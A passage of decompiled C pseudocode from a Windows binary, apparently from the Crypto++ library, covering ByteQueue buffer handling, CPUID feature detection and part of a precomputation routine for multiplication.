      v2 = (_DWORD *)*v1;
      sub_4089EF(v1 + 1);
      sub_42CF7C(v1);
      v1 = v2;
    }
    while ( v2 );
  }
}
// 46E0E8: using guessed type void *CryptoPP::ByteQueue::`vftable';
// 46E19C: using guessed type void *CryptoPP::ByteQueue::`vftable';

//----- (00424CAC) --------------------------------------------------------
char *__thiscall sub_424CAC(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 1);
  sub_424C9A(this - 1);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(v2);
  return v2;
}

//----- (00424CD3) --------------------------------------------------------
void __thiscall sub_424CD3(_DWORD *this)
{
  _DWORD *v2; // edi
  int v3; // ecx

  while ( this[5] )
  {
    v2 = (_DWORD *)this[5];
    if ( v2 == (_DWORD *)this[6] || v2[5] != v2[3] )
      break;
    this[5] = *v2;
    if ( v2 )
    {
      sub_4089EF(v2 + 1);
      sub_42CF7C(v2);
    }
  }
  v3 = this[5];
  if ( v3 )
  {
    if ( *(_DWORD *)(v3 + 24) == *(_DWORD *)(v3 + 20) )
    {
      *(_DWORD *)(v3 + 24) = 0;
      *(_DWORD *)(v3 + 20) = 0;
    }
  }
}

//----- (00424D28) --------------------------------------------------------
_DWORD *__thiscall sub_424D28(int this)
{
  _DWORD *v2; // ebx
  _DWORD *v3; // esi
  int v4; // eax
  _DWORD *result; // eax

  v2 = **(_DWORD ***)(this + 20);
  if ( v2 )
  {
    do
    {
      v3 = (_DWORD *)*v2;
      sub_4089EF(v2 + 1);
      sub_42CF7C(v2);
      v2 = v3;
    }
    while ( v3 );
  }
  v4 = *(_DWORD *)(this + 20);
  *(_DWORD *)(this + 24) = v4;
  *(_DWORD *)(v4 + 24) = 0;
  *(_DWORD *)(v4 + 20) = 0;
  result = *(_DWORD **)(this + 20);
  *result = 0;
  *(_DWORD *)(this + 32) = 0;
  return result;
}

//----- (00424D6A) --------------------------------------------------------
int __thiscall sub_424D6A(void *this, int a2, int *a3, __int64 a4, int a5, int a6)
{
  int result; // eax
  bool v7; // cf
  __int64 v8; // [esp+Ch] [ebp-3Ch] BYREF
  _DWORD v9[12]; // [esp+14h] [ebp-34h] BYREF

  sub_40AC29(v9, (int)this);
  sub_40DB06(v9, *a3, a3[1]);
  v8 = a4 - *(_QWORD *)a3;
  result = sub_425370(v9, a2, (unsigned int *)&v8, a5, a6);
  v7 = __CFADD__((_DWORD)v8, *a3);
  *a3 += v8;
  a3[1] += HIDWORD(v8) + v7;
  return result;
}
// 424D6A: using guessed type _DWORD var_34[12];

//----- (00424DDC) --------------------------------------------------------
int __thiscall sub_424DDC(_DWORD *this, int a2, int *a3, __int64 a4, int a5, int a6)
{
  int result; // eax
  bool v7; // cf
  __int64 v8; // [esp+Ch] [ebp-3Ch] BYREF
  _DWORD v9[12]; // [esp+14h] [ebp-34h] BYREF

  sub_424C54(v9, this);
  sub_40DB06(v9, *a3, a3[1]);
  v8 = a4 - *(_QWORD *)a3;
  result = sub_425370(v9, a2, (unsigned int *)&v8, a5, a6);
  v7 = __CFADD__((_DWORD)v8, *a3);
  *a3 += v8;
  a3[1] += HIDWORD(v8) + v7;
  return result;
}
// 424DDC: using guessed type _DWORD var_34[12];

//----- (00424E4E) --------------------------------------------------------
int __thiscall sub_424E4E(int this, size_t *Block)
{
  _DWORD *v3; // edi
  _DWORD *v4; // eax
  size_t *v5; // edx

  v3 = 0;
  if ( *(_DWORD *)(this + 32) )
    sub_424F26((_DWORD *)this);
  if ( *(_DWORD *)(*(_DWORD *)(this + 24) + 24) == *(_DWORD *)(*(_DWORD *)(this + 24) + 12) )
  {
    v4 = operator new(0x1Cu);
    if ( v4 )
    {
      v5 = (size_t *)(this + 16);
      if ( *(_DWORD *)(this + 16) < *Block )
        v5 = Block;
      v3 = sub_424C2C(v4, *v5);
    }
    **(_DWORD **)(this + 24) = v3;
    *(_DWORD *)(this + 24) = **(_DWORD **)(this + 24);
  }
  *Block = *(_DWORD *)(*(_DWORD *)(this + 24) + 12) - *(_DWORD *)(*(_DWORD *)(this + 24) + 24);
  return *(_DWORD *)(*(_DWORD *)(this + 24) + 16) + *(_DWORD *)(*(_DWORD *)(this + 24) + 24);
}

//----- (00424EC6) --------------------------------------------------------
__int64 __thiscall sub_424EC6(_DWORD *this)
{
  _DWORD *v1; // edx
  __int64 v2; // rdi
  int v3; // eax

  v1 = (_DWORD *)this[5];
  v2 = 0i64;
  while ( v1 )
  {
    v3 = v1[6] - v1[5];
    v1 = (_DWORD *)*v1;
    v2 += (unsigned int)v3;
  }
  return v2 + (unsigned int)this[8];
}

//----- (00424F26) --------------------------------------------------------
int __thiscall sub_424F26(_DWORD *this)
{
  int v1; // edx
  int result; // eax

  v1 = this[8];
  this[8] = 0;
  if ( v1 )
    return (*(int (__thiscall **)(_DWORD *, _DWORD, int, _DWORD, int))(*this + 20))(this, this[7], v1, 0, 1);
  return result;
}

//----- (00424F3F) --------------------------------------------------------
int __thiscall sub_424F3F(_DWORD *this, _BYTE *a2)
{
  _DWORD *v3; // esi
  int v4; // eax

  v3 = (_DWORD *)this[5];
  v4 = sub_425104(v3, a2);
  v3[5] += v4;
  if ( v4 )
  {
    if ( *(_DWORD *)(this[5] + 20) == *(_DWORD *)(this[5] + 12) )
      sub_424CD3(this);
    return 1;
  }
  if ( this[8] )
  {
    *a2 = *(_BYTE *)this[7]++;
    --this[8];
    return 1;
  }
  return 0;
}

//----- (00424F8E) --------------------------------------------------------
int __thiscall sub_424F8E(int *this, int a2, int a3)
{
  int v4; // eax
  int v6[2]; // [esp+10h] [ebp-38h] BYREF
  _DWORD v7[12]; // [esp+18h] [ebp-30h] BYREF

  sub_40C08D(v7, a2, a3);
  v4 = *this;
  v7[11] = 0;
  v6[1] = 0;
  v6[0] = a3;
  (*(void (__thiscall **)(int *, _DWORD *, int *, _DWORD *, int))(v4 + 124))(this, v7, v6, dword_48C1A8, 1);
  return v6[0];
}
// 48C1A8: using guessed type _DWORD dword_48C1A8[6];

//----- (00424FD7) --------------------------------------------------------
int __thiscall sub_424FD7(int *this, int a2)
{
  int v3; // eax
  int v5[2]; // [esp+10h] [ebp-38h] BYREF
  _DWORD v6[12]; // [esp+18h] [ebp-30h] BYREF

  sub_40C08D(v6, a2, 1);
  v3 = *this;
  v6[11] = 0;
  v5[1] = 0;
  v5[0] = 1;
  (*(void (__thiscall **)(int *, _DWORD *, int *, _DWORD *, int))(v3 + 124))(this, v6, v5, dword_48C1A8, 1);
  return v5[0];
}
// 48C1A8: using guessed type _DWORD dword_48C1A8[6];

//----- (0042501F) --------------------------------------------------------
bool __thiscall sub_42501F(_DWORD *this)
{
  int v1; // esi
  char v2; // dl

  v1 = this[5];
  v2 = 0;
  if ( v1 == this[6] && *(_DWORD *)(v1 + 24) == *(_DWORD *)(v1 + 20) )
    return this[8] == 0;
  return v2;
}

//----- (0042503C) --------------------------------------------------------
_DWORD *__thiscall sub_42503C(_DWORD *this, int a2)
{
  char v3; // al
  int v4; // ecx

  v3 = (*(int (__thiscall **)(int, const char *, int *, int *))(*(_DWORD *)a2 + 4))(
         a2,
         "NodeSize",
         &int `RTTI Type Descriptor',
         &a2);
  v4 = 256;
  if ( v3 )
    v4 = a2;
  this[4] = v4;
  return sub_424D28((int)this);
}
// 49074C: using guessed type int int `RTTI Type Descriptor';

//----- (00425072) --------------------------------------------------------
int __thiscall sub_425072(_DWORD *this, int a2)
{
  _DWORD *v2; // edx
  int result; // eax

  v2 = (_DWORD *)this[3];
  this[4] = v2[5];
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  this[9] = v2[7];
  result = v2[8];
  this[10] = result;
  return result;
}

//----- (00425095) --------------------------------------------------------
int __thiscall sub_425095(int this, _BYTE *a2)
{
  if ( sub_425104(*(_DWORD **)(this + 20), a2) )
    return 1;
  if ( *(_DWORD *)(this + 32) )
  {
    *a2 = **(_BYTE **)(this + 28);
    return 1;
  }
  return 0;
}

//----- (004250C5) --------------------------------------------------------
__int64 __thiscall sub_4250C5(void *this, int a2, int a3)
{
  _DWORD v5[12]; // [esp+10h] [ebp-30h] BYREF

  sub_40C08D(v5, a2, a3);
  v5[11] = 0;
  return sub_40B21E(this, (int)v5, 0i64, (unsigned int)a3, (int)dword_48C1A8);
}
// 48C1A8: using guessed type _DWORD dword_48C1A8[6];

//----- (00425104) --------------------------------------------------------
int __thiscall sub_425104(_DWORD *this, _BYTE *a2)
{
  int v2; // edx

  v2 = this[5];
  if ( this[6] == v2 )
    return 0;
  *a2 = *(_BYTE *)(v2 + this[4]);
  return 1;
}

//----- (00425122) --------------------------------------------------------
__int64 __thiscall sub_425122(void *this, int a2)
{
  _DWORD v4[12]; // [esp+10h] [ebp-30h] BYREF

  sub_40C08D(v4, a2, 1);
  v4[11] = 0;
  return sub_40B21E(this, (int)v4, 0i64, 1i64, (int)dword_48C1A8);
}
// 48C1A8: using guessed type _DWORD dword_48C1A8[6];

//----- (0042515F) --------------------------------------------------------
int __thiscall sub_42515F(int this, char *Src, int a3, int a4, int a5)
{
  unsigned int v6; // edi
  _DWORD *v8; // ecx
  bool v9; // zf
  unsigned int v10; // eax
  _DWORD *v11; // eax
  size_t *v12; // edx
  _DWORD *v13; // ecx
  _DWORD **v14; // eax
  size_t v15; // eax

  if ( *(_DWORD *)(this + 32) )
    sub_424F26((_DWORD *)this);
  v6 = a3;
  v8 = *(_DWORD **)(this + 24);
  while ( 1 )
  {
    v15 = sub_4251FF(v8, Src, v6);
    if ( v15 >= v6 )
      break;
    v6 -= v15;
    Src += v15;
    v9 = *(_BYTE *)(this + 12) == 0;
    a3 = v6;
    if ( !v9 && *(_DWORD *)(this + 16) < 0x4000u )
    {
      do
      {
        v10 = 2 * *(_DWORD *)(this + 16);
        *(_DWORD *)(this + 16) = v10;
      }
      while ( v10 < v6 && v10 < 0x4000 );
    }
    v11 = operator new(0x1Cu);
    if ( v11 )
    {
      v12 = (size_t *)&a3;
      if ( *(_DWORD *)(this + 16) >= v6 )
        v12 = (size_t *)(this + 16);
      v13 = sub_424C2C(v11, *v12);
    }
    else
    {
      v13 = 0;
    }
    **(_DWORD **)(this + 24) = v13;
    v14 = *(_DWORD ***)(this + 24);
    v8 = *v14;
    *(_DWORD *)(this + 24) = *v14;
  }
  return 0;
}

//----- (004251FF) --------------------------------------------------------
size_t __thiscall sub_4251FF(_DWORD *this, void *Src, unsigned int a3)
{
  size_t v3; // esi
  void *v5; // eax

  v3 = a3;
  if ( Src && a3 )
  {
    if ( this[3] - this[6] < a3 )
      v3 = this[3] - this[6];
    v5 = (void *)(this[6] + this[4]);
    if ( v5 != Src )
      memmove_0(v5, Src, v3);
    this[6] += v3;
  }
  return v3;
}

//----- (0042523D) --------------------------------------------------------
int __thiscall sub_42523D(int this, int *a2, unsigned int *a3, int a4, char a5)
{
  unsigned int *v5; // ebx
  unsigned int v7; // ecx
  int v8; // edx
  _DWORD *v9; // ebx
  unsigned int v10; // esi
  int v11; // eax
  unsigned int v12; // eax
  unsigned int v13; // ecx
  int v15; // esi
  int v16; // [esp-Ch] [ebp-6Ch]
  unsigned __int64 v17; // [esp+14h] [ebp-4Ch] BYREF
  int v18; // [esp+1Ch] [ebp-44h]
  __int64 v19; // [esp+20h] [ebp-40h] BYREF
  _DWORD *v20; // [esp+28h] [ebp-38h]
  _DWORD v21[12]; // [esp+2Ch] [ebp-34h] BYREF

  v5 = a3;
  LODWORD(v19) = a3;
  v18 = a4;
  if ( a5 )
  {
    v7 = *a3;
    v8 = a3[1];
    v20 = *(_DWORD **)(this + 20);
    v17 = __PAIR64__(v8, v7);
    if ( __PAIR64__(v7, v8) )
    {
      v9 = v20;
      do
      {
        if ( !v9 )
          break;
        v17 -= (unsigned int)sub_42549E(v9, (int)a2, v7, v8, a4);
        v8 = HIDWORD(v17);
        v7 = v17;
        v9 = (_DWORD *)*v9;
      }
      while ( v17 );
      v5 = (unsigned int *)v19;
    }
    sub_424CD3((_DWORD *)this);
    v19 = *(unsigned int *)(this + 32);
    v10 = *(_DWORD *)sub_40AA7B(&v17, &v19);
    if ( v10 )
    {
      v11 = *a2;
      v16 = *(_DWORD *)(this + 28);
      if ( *(_BYTE *)(this + 36) )
        (*(void (__thiscall **)(int *, int, int, unsigned int, _DWORD, int))(v11 + 140))(a2, v18, v16, v10, 0, 1);
      else
        (*(void (__thiscall **)(int *, int, int, unsigned int, _DWORD, int))(v11 + 136))(a2, v18, v16, v10, 0, 1);
      *(_DWORD *)(this + 28) += v10;
      *(_DWORD *)(this + 32) -= v10;
      v13 = (v17 - v10) >> 32;
      v12 = v17 - v10;
    }
    else
    {
      v13 = HIDWORD(v17);
      v12 = v17;
    }
    *(_QWORD *)v5 -= __PAIR64__(v13, v12);
    return 0;
  }
  else
  {
    sub_40AC29(v21, this);
    v15 = sub_425370(v21, (int)a2, a3, a4, 0);
    (*(void (__thiscall **)(int, unsigned int, unsigned int))(*(_DWORD *)this + 84))(this, *a3, a3[1]);
    return v15;
  }
}
// 42523D: using guessed type _DWORD var_34[12];

//----- (00425370) --------------------------------------------------------
int __thiscall sub_425370(_DWORD *this, int a2, unsigned int *a3, int a4, int a5)
{
  int v7; // ebp
  unsigned int v8; // ecx
  unsigned int v9; // edx
  _DWORD *v10; // ebx
  unsigned int *v11; // eax
  bool v12; // cf
  unsigned int v13; // ecx
  unsigned int v14; // eax
  unsigned int *v15; // eax
  unsigned int v16; // ebx
  int result; // eax
  unsigned __int64 v18; // [esp+28h] [ebp-10h] BYREF
  unsigned __int64 v19; // [esp+30h] [ebp-8h] BYREF
  unsigned int v20; // [esp+40h] [ebp+8h]

  v7 = 0;
  v8 = *a3;
  v9 = a3[1];
  v10 = (_DWORD *)this[4];
  LODWORD(v18) = *a3;
  HIDWORD(v18) = v9;
  while ( v10 )
  {
    v19 = (unsigned int)(v10[6] - v10[5]) - (unsigned __int64)(unsigned int)this[8];
    v11 = (unsigned int *)sub_40AA7B(&v18, &v19);
    v20 = *v11;
    v7 = (*(int (__thiscall **)(int, int, int, unsigned int, _DWORD, int))(*(_DWORD *)a2 + 136))(
           a2,
           a4,
           v10[4] + this[8] + v10[5],
           *v11,
           0,
           a5);
    if ( v7 )
      goto LABEL_11;
    v12 = __CFADD__(v20, this[6]);
    this[6] += v20;
    v13 = v18;
    this[7] += v12;
    v9 = (__PAIR64__(HIDWORD(v18), v13) - v20) >> 32;
    v8 = v13 - v20;
    v18 = __PAIR64__(v9, v8);
    if ( !__PAIR64__(v8, v9) )
    {
      this[8] += v20;
      goto LABEL_12;
    }
    v10 = *(_DWORD **)this[4];
    this[8] = 0;
    this[4] = v10;
  }
  if ( __PAIR64__(v8, v9) )
  {
    v14 = this[10];
    if ( v14 )
    {
      v19 = v14;
      v15 = (unsigned int *)sub_40AA7B(&v18, &v19);
      v16 = *v15;
      v7 = (*(int (__thiscall **)(int, int, _DWORD, unsigned int, _DWORD, int))(*(_DWORD *)a2 + 136))(
             a2,
             a4,
             this[9],
             *v15,
             0,
             a5);
      if ( !v7 )
      {
        this[9] += v16;
        this[10] -= v16;
        v9 = (v18 - v16) >> 32;
        v8 = v18 - v16;
        goto LABEL_12;
      }
LABEL_11:
      v9 = HIDWORD(v18);
      v8 = v18;
    }
  }
LABEL_12:
  v12 = *a3 < v8;
  *a3 -= v8;
  result = v7;
  a3[1] -= v12 + v9;
  return result;
}

//----- (0042549E) --------------------------------------------------------
int __thiscall sub_42549E(_DWORD *this, int a2, unsigned int a3, int a4, int a5)
{
  int v6; // edi

  if ( a4 || (v6 = a3, a3 >= this[6] - this[5]) )
    v6 = this[6] - this[5];
  (*(void (__thiscall **)(int, int, int, int, _DWORD, int))(*(_DWORD *)a2 + 140))(a2, a5, this[5] + this[4], v6, 0, 1);
  this[5] += v6;
  return v6;
}

//----- (004254E3) --------------------------------------------------------
int sub_4254E3()
{
  char v10; // al
  int v11; // esi
  int result; // eax
  __int16 v33; // [esp+Ch] [ebp-34h]
  int v34; // [esp+14h] [ebp-2Ch]
  unsigned int v35; // [esp+1Ch] [ebp-24h]
  unsigned int v36; // [esp+2Ch] [ebp-14h]
  int v37; // [esp+30h] [ebp-10h]
  int v38; // [esp+34h] [ebp-Ch]
  int v39; // [esp+38h] [ebp-8h]

  _EAX = 0;
  __asm { cpuid }
  v36 = _EAX;
  v37 = _EBX;
  _EAX = 1;
  v38 = _ECX;
  v39 = _EDX;
  __asm { cpuid }
  v33 = _EAX;
  v34 = _ECX;
  if ( (_EDX & 0x4000000) != 0 )
  {
    if ( (_ECX & 0x8000000) == 0 )
    {
      v10 = sub_4295BE();
      if ( !v10 )
      {
        byte_491D09 = 0;
        goto LABEL_5;
      }
      _ECX = v34;
    }
    v10 = 1;
    byte_491D09 = 1;
  }
  else
  {
    v10 = byte_491D09;
  }
  if ( v10 && (_ECX & 0x200) != 0 )
  {
    byte_491D0A = 1;
    goto LABEL_6;
  }
LABEL_5:
  _ECX = v34;
  byte_491D0A = 0;
LABEL_6:
  if ( !v10 || (byte_491D0B = 1, (_ECX & 0x80000) == 0) )
    byte_491D0B = 0;
  if ( !v10 || (byte_491D0C = 1, (_ECX & 0x100000) == 0) )
    byte_491D0C = 0;
  if ( !v10 || (byte_491D0D = 1, (_ECX & 0x2000000) == 0) )
    byte_491D0D = 0;
  if ( !v10 || (byte_491D0E = 1, (_ECX & 2) == 0) )
    byte_491D0E = 0;
  if ( v37 == 1970169159 )
  {
    if ( v38 == 1818588270 && v39 == 1231384169 )
    {
      byte_491D11 = (v33 & 0xF00) == 3840;
      v11 = 8 * BYTE1(_EBX);
      byte_491D12 = (_ECX & 0x40000000) != 0;
      goto LABEL_32;
    }
    goto LABEL_39;
  }
  if ( v37 != 1752462657 )
  {
    if ( v37 == 1953391939 && v38 == 1936487777 && v39 == 1215460705 )
    {
      _EAX = -1073741824;
      __asm { cpuid }
      v35 = _EAX;
      _EAX = -1073741823;
      if ( v35 >= 0xC0000001 )
      {
        __asm { cpuid }
        byte_491D14 = (_EDX & 0xC) != 0;
        byte_491D15 = (_EDX & 0xC0) != 0;
        byte_491D16 = (_EDX & 0x300) != 0;
        byte_491D17 = (_EDX & 0xC00) != 0;
        byte_491D18 = (_EDX & 0x3000) != 0;
      }
    }
    goto LABEL_39;
  }
  if ( v38 != 1145913699 || v39 != 1769238117 )
  {
LABEL_39:
    v11 = dword_48C1F8;
    goto LABEL_40;
  }
  _EAX = -2147483643;
  __asm { cpuid }
  v11 = (unsigned __int8)_ECX;
  byte_491D12 = (v34 & 0x40000000) != 0;
LABEL_32:
  if ( v36 >= 7 )
  {
    _EAX = 7;
    __asm { cpuid }
    byte_491D13 = (_EBX & 0x40000) != 0;
    byte_491D10 = (_EBX & 0x80000) != 0;
    byte_491D0F = (_EBX & 0x20000000) != 0;
  }
LABEL_40:
  result = 32;
  if ( !v11 )
    v11 = 32;
  dword_48C1F8 = v11;
  byte_491D08 = 1;
  return result;
}
// 48C1F8: using guessed type int dword_48C1F8;
// 491D08: using guessed type char byte_491D08;
// 491D09: using guessed type char byte_491D09;
// 491D0A: using guessed type char byte_491D0A;
// 491D0B: using guessed type char byte_491D0B;
// 491D0C: using guessed type char byte_491D0C;
// 491D0D: using guessed type char byte_491D0D;
// 491D0E: using guessed type char byte_491D0E;
// 491D0F: using guessed type char byte_491D0F;
// 491D10: using guessed type char byte_491D10;
// 491D11: using guessed type char byte_491D11;
// 491D12: using guessed type char byte_491D12;
// 491D13: using guessed type char byte_491D13;
// 491D14: using guessed type char byte_491D14;
// 491D15: using guessed type char byte_491D15;
// 491D16: using guessed type char byte_491D16;
// 491D17: using guessed type char byte_491D17;
// 491D18: using guessed type char byte_491D18;

//----- (004257AB) --------------------------------------------------------
int sub_4257AB()
{
  return dword_491D1C;
}
// 491D1C: using guessed type int dword_491D1C;

//----- (004257B1) --------------------------------------------------------
void *__cdecl sub_4257B1(char *Block, char *a2)
{
  void *result; // eax

  while ( Block != a2 )
  {
    result = sub_425BD6(Block, 0);
    Block += 64;
  }
  return result;
}

//----- (004257CC) --------------------------------------------------------
int __cdecl sub_4257CC(void **a1, void **a2)
{
  int result; // eax

  while ( a1 != a2 )
  {
    result = sub_42682C(a1);
    a1 += 3;
  }
  return result;
}

//----- (004257E5) --------------------------------------------------------
int __cdecl sub_4257E5(int (__thiscall ***a1)(_DWORD, _DWORD), int (__thiscall ***a2)(_DWORD, _DWORD))
{
  int result; // eax

  while ( a1 != a2 )
  {
    result = (**a1)(a1, 0);
    a1 += 6;
  }
  return result;
}

//----- (004257FF) --------------------------------------------------------
void *__cdecl sub_4257FF(char *a1, int a2, int *a3)
{
  void *result; // eax

  while ( a2 )
  {
    if ( a1 )
      result = sub_40E80A(a1, a3);
    --a2;
    a1 += 24;
  }
  return result;
}

//----- (0042585E) --------------------------------------------------------
void __cdecl sub_42585E(_DWORD *a1, int a2)
{
  int i; // ecx

  for ( i = a2; i; --i )
  {
    if ( a1 )
    {
      *a1 = 0;
      a1[1] = 0;
      a1[2] = 0;
    }
    a1 += 3;
  }
}

//----- (00425881) --------------------------------------------------------
void __cdecl sub_425881(char *a1, int a2)
{
  while ( a2 )
  {
    if ( a1 )
      sub_40E940(a1);
    --a2;
    a1 += 24;
  }
}

//----- (004258DD) --------------------------------------------------------
int __cdecl sub_4258DD(int a1, int a2, int a3)
{
  while ( a1 != a2 )
  {
    if ( a3 )
      sub_425AA6(a3, a1);
    a3 += 64;
    a1 += 64;
  }
  return a3;
}

//----- (00425942) --------------------------------------------------------
char *__cdecl sub_425942(int *a1, int *a2, char *a3)
{
  while ( a1 != a2 )
  {
    if ( a3 )
      sub_40E80A(a3, a1);
    a3 += 24;
    a1 += 6;
  }
  return a3;
}

//----- (004259A4) --------------------------------------------------------
int __cdecl sub_4259A4(int a1, int a2, int a3)
{
  return sub_4258DD(a1, a2, a3);
}

//----- (004259C9) --------------------------------------------------------
char *__cdecl sub_4259C9(int *a1, int *a2, char *a3)
{
  return sub_425942(a1, a2, a3);
}

//----- (004259EE) --------------------------------------------------------
_DWORD *__thiscall sub_4259EE(_DWORD *this, unsigned int a2)
{
  *this = 0;
  this[1] = 0;
  this[2] = 0;
  if ( sub_4264D7(this, a2) )
  {
    sub_42585E((_DWORD *)*this, a2);
    this[1] += 12 * a2;
  }
  return this;
}

//----- (00425A4A) --------------------------------------------------------
int __thiscall sub_425A4A(int this, int a2)
{
  *(_DWORD *)this = 0;
  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)(this + 8) = 0;
  if ( sub_426525((_DWORD *)this, a2) )
  {
    sub_425881(*(char **)this, a2);
    *(_DWORD *)(this + 4) += 24 * a2;
  }
  return this;
}

//----- (00425AA6) --------------------------------------------------------
int __thiscall sub_425AA6(int this, int a2)
{
  sub_40E80A((void *)this, (int *)a2);
  sub_40E80A((void *)(this + 24), (int *)(a2 + 24));
  *(_DWORD *)(this + 48) = *(_DWORD *)(a2 + 48);
  *(_DWORD *)(this + 52) = *(_DWORD *)(a2 + 52);
  *(_DWORD *)(this + 56) = *(_DWORD *)(a2 + 56);
  *(_BYTE *)(this + 60) = *(_BYTE *)(a2 + 60);
  *(_BYTE *)(this + 61) = *(_BYTE *)(a2 + 61);
  *(_BYTE *)(this + 62) = *(_BYTE *)(a2 + 62);
  *(_BYTE *)(this + 63) = *(_BYTE *)(a2 + 63);
  return this;
}

//----- (00425B04) --------------------------------------------------------
int __thiscall sub_425B04(int this, int *a2, char a3, int a4)
{
  int *v5; // eax
  unsigned int v6; // eax
  int v7; // edx

  sub_40E80A((void *)this, a2);
  v5 = sub_4128E4();
  sub_40E80A((void *)(this + 24), v5);
  *(_DWORD *)(this + 48) = a4;
  *(_DWORD *)(this + 52) = 0;
  *(_DWORD *)(this + 56) = 0;
  *(_BYTE *)(this + 60) = a3;
  *(_BYTE *)(this + 61) = 0;
  *(_BYTE *)(this + 62) = 1;
  *(_BYTE *)(this + 63) = 0;
  if ( !a4 )
  {
    v6 = sub_410F9E((int *)this);
    v7 = (v6 > 0x59A) + 6;
    if ( v6 <= 0x21B )
      v7 = 5;
    if ( v6 <= 0xC5 )
      v7 = 4;
    if ( v6 <= 0x46 )
      v7 = 3;
    if ( v6 <= 0x18 )
      v7 = 2;
    if ( v6 <= 0x11 )
      v7 = 1;
    *(_DWORD *)(this + 48) = v7;
  }
  sub_40F028((int *)(this + 24), *(_DWORD *)(this + 48));
  return this;
}

//----- (00425BD6) --------------------------------------------------------
void *__thiscall sub_425BD6(void *Block, char a2)
{
  sub_40891D((int)Block + 28);
  sub_40891D((int)Block + 4);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00425C00) --------------------------------------------------------
int __thiscall sub_425C00(void *this, int a2, void *a3, int *a4, int *a5, int *a6)
{
  int *v6; // eax

  v6 = (int *)(*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 88))(this, a2);
  sub_425C2C(v6, a3, a4, a5, a6, 0);
  return a2;
}

//----- (00425C2C) --------------------------------------------------------
void *__thiscall sub_425C2C(int *this, void *a2, int *a3, int *a4, int *a5, int *a6)
{
  unsigned int *v7; // ecx
  unsigned int v8; // eax
  int *v9; // eax
  int v10; // ecx
  unsigned int v11; // esi
  unsigned int v12; // edi
  void *v13; // esi
  int *v14; // eax
  int *v15; // eax
  int *v16; // eax
  unsigned int v17; // edi
  char *v18; // esi
  int *v19; // eax
  int v20; // edx
  unsigned int v21; // ecx
  unsigned int v22; // eax
  int v23; // ecx
  int *v24; // eax
  unsigned int v25; // eax
  unsigned int v26; // edi
  int v27; // esi
  char *v28; // ecx
  int *v29; // eax
  unsigned int v30; // edi
  char *v31; // eax
  unsigned int v32; // ecx
  unsigned int v33; // edx
  int v34; // esi
  int v35; // edi
  unsigned int v36; // esi
  int *v37; // eax
  unsigned int v38; // edi
  unsigned int v39; // esi
  signed int v40; // edx
  bool i; // sf
  unsigned __int8 v42; // al
  unsigned int v43; // edx
  int v44; // ecx
  int v45; // eax
  int *v46; // eax
  int j; // esi
  int *v48; // eax
  int v50; // [esp+10h] [ebp-70h] BYREF
  char v51[20]; // [esp+14h] [ebp-6Ch] BYREF
  void *v52[4]; // [esp+28h] [ebp-58h] BYREF
  int v53; // [esp+38h] [ebp-48h]
  unsigned int v54; // [esp+3Ch] [ebp-44h]
  int v55; // [esp+40h] [ebp-40h]
  unsigned int v56; // [esp+44h] [ebp-3Ch] BYREF
  unsigned int v57; // [esp+48h] [ebp-38h] BYREF
  unsigned int v58; // [esp+4Ch] [ebp-34h]
  unsigned int v59; // [esp+50h] [ebp-30h]
  char *v60; // [esp+54h] [ebp-2Ch]
  unsigned int v61; // [esp+58h] [ebp-28h]
  unsigned int v62; // [esp+5Ch] [ebp-24h]
  int v63; // [esp+60h] [ebp-20h]
  unsigned int v64; // [esp+64h] [ebp-1Ch]
  unsigned int v65; // [esp+68h] [ebp-18h]
  int v66; // [esp+6Ch] [ebp-14h]
  unsigned int v67; // [esp+70h] [ebp-10h]
  int v68; // [esp+7Ch] [ebp-4h]
  int v69; // [esp+8Ch] [ebp+Ch]
  char *v70; // [esp+94h] [ebp+14h]
  unsigned int v71; // [esp+94h] [ebp+14h]
  unsigned int v72; // [esp+94h] [ebp+14h]

  v52[3] = 0;
  v56 = sub_410F9E(a6);
  v57 = sub_410F9E(a4);
  v7 = &v56;
  if ( v57 >= v56 )
    v7 = &v57;
  v8 = *v7;
  v53 = v8;
  if ( v8 )
  {
    v10 = (v8 > 0x104) + 2;
    v56 = 1;
    if ( v8 <= 0x2E )
      v10 = 1;
    v11 = 1 << v10;
    v63 = v10;
    v12 = 1 << v10 << v10;
    v64 = 1 << v10;
    v67 = v12;
    sub_425A4A((int)v52, v12);
    v68 = 0;
    v65 = (unsigned int)v52[0] + 24;
    sub_40EC6C((int)v52[0] + 24, a3);
    v55 = 24 * v11;
    v59 = (unsigned int)v52[0] + 24 * v11;
    sub_40EC6C(v59, a5);
    if ( v63 == 1 )
    {
      v13 = v52[0];
      v14 = (int *)(*(int (__thiscall **)(int *, int *, int *))(*this + 12))(this, a3, a5);
      sub_40EC6C((int)v13 + 72, v14);
    }
    else
    {
      v66 = (int)v52[0] + 48;
      v15 = (int *)(*(int (__thiscall **)(int *, int *))(*this + 24))(this, a3);
      sub_40EC6C(v66, v15);
      v54 = 48 * v11;
      v57 = (unsigned int)v52[0] + 48 * v11;
      v16 = (int *)(*(int (__thiscall **)(int *, int *))(*this + 24))(this, a5);
      sub_40EC6C(v57, v16);
      if ( v11 > 3 )
      {
        v17 = ((v11 - 4) >> 1) + 1;
        v18 = (char *)v52[0] + 72;
        do
        {
          v19 = (int *)(*(int (__thiscall **)(int *, char *, int))(*this + 12))(this, v18 - 48, v66);
          sub_40EC6C((int)v18, v19);
          v18 += 48;
          --v17;
        }
        while ( v17 );
        v11 = v64;
        v12 = v67;
      }
      v20 = v59 + 24;
      v21 = v11 + 1;
      v59 += 24;
      v22 = ((v11 - 2) >> 1) + 1;
      v60 = (char *)(v11 + 1);
      v58 = v22;
      do
      {
        v62 = v21;
        if ( v21 < v12 )
        {
          v23 = v65;
          v66 = v20;
          v61 = v65;
          do
          {
            v24 = (int *)(*(int (__thiscall **)(int *, int, int *))(*this + 12))(this, v23, a5);
            sub_40EC6C(v66, v24);
            v23 = v55 + v61;
            v66 += v55;
            v62 += v11;
            v61 += v55;
          }
          while ( v62 < v12 );
          v22 = v58;
          v21 = (unsigned int)v60;
          v20 = v59;
        }
        v65 += 48;
        v21 += 2;
        v20 += 48;
        v60 = (char *)v21;
        --v22;
        v59 = v20;
        v58 = v22;
      }
      while ( v22 );
      v25 = v67;
      v26 = 3 * v11;
      if ( 3 * v11 < v67 )
      {
        v58 = 2 * v11;
        v55 = (int)v52[0] + 72 * v11;
